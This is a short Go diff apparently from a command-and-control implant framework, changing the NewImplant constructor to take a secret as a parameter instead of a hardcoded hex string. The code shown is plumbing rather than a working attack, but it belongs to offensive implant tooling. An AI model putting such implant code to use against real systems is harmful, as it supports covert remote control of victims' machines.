@@ -37,11 +37,11 @@ type Task struct {
 }
 
 
-func NewImplant(c2ServerURL string) *plant {
+func NewImplant(c2ServerURL string,secret string) *plant {
 	plantID := Get_id()
 	return &plant{
 		C2ServerURL: c2ServerURL,
-		Secret:      "e7bcc0ba5fb1dc9cc09460baaa2a6986",
+		Secret:      secret,
 		plantID:   plantID,
 		Modules:     make(map[string]modules.Module),
 	}
